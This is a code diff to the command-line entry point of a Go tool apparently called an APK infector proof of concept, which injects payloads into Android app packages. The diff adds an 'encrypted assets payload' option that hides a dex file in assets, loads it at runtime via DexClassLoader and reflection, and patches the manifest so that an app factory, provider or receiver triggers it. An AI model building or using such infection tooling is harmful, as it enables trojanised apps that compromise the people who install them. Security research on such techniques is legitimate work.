@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
@@ -16,7 +17,7 @@ import (
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 )
 
-var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)"
+var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)"
 
 func main() {
 
@@ -35,7 +36,7 @@ func main() {
 		return
 	}
 
-	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2" && os.Args[4] != "3" && os.Args[4] != "4" && os.Args[4] != "5" && os.Args[4] != "6" && os.Args[4] != "7") {
+	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2" && os.Args[4] != "3" && os.Args[4] != "4" && os.Args[4] != "5" && os.Args[4] != "6" && os.Args[4] != "7" && os.Args[4] != "8") {
 		fmt.Println(help_str)
 		return
 	}
@@ -54,6 +55,8 @@ func main() {
 		utils.Payload_option = int(utils.AppComponentFactory_payload)
 	} else if os.Args[4] == "7" {
 		utils.Payload_option = int(utils.Native_payload)
+	} else if os.Args[4] == "8" {
+		utils.Payload_option = int(utils.Assets_payload)
 	}
 
 	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
@@ -92,6 +95,23 @@ func main() {
 	} else if utils.Payload_option == int(utils.AppComponentFactory_payload) {
 		fmt.Println("	--Patching manifest (app component factory inject)...")
 		manifest.PatchAppComponentFactory()
+	} else if utils.Payload_option == int(utils.Assets_payload) {
+		// The loader stub is identical for every trigger -- only the manifest
+		// entry differs, so the assets vector reuses the existing patchers.
+		trigger := strings.ToLower(os.Getenv("ARCHINOME_ASSETS_VECTOR"))
+		switch trigger {
+		case "provider":
+			fmt.Println("	--Patching manifest (assets payload, provider trigger)...")
+			manifest.PatchProvider()
+		case "receiver":
+			fmt.Println("	--Patching manifest (assets payload, receiver trigger)...")
+			manifest.PatchReceiver()
+		case "", "appfactory":
+			fmt.Println("	--Patching manifest (assets payload, appComponentFactory trigger)...")
+			manifest.PatchAppComponentFactory()
+		default:
+			log.Panicf("unknown ARCHINOME_ASSETS_VECTOR %q (appfactory|provider|receiver)", trigger)
+		}
 	} else if utils.Payload_option == int(utils.Native_payload) {
 		// The native vector does not touch the manifest or the dex at all.
 		fmt.Println("	--Native vector: manifest and dex left untouched")
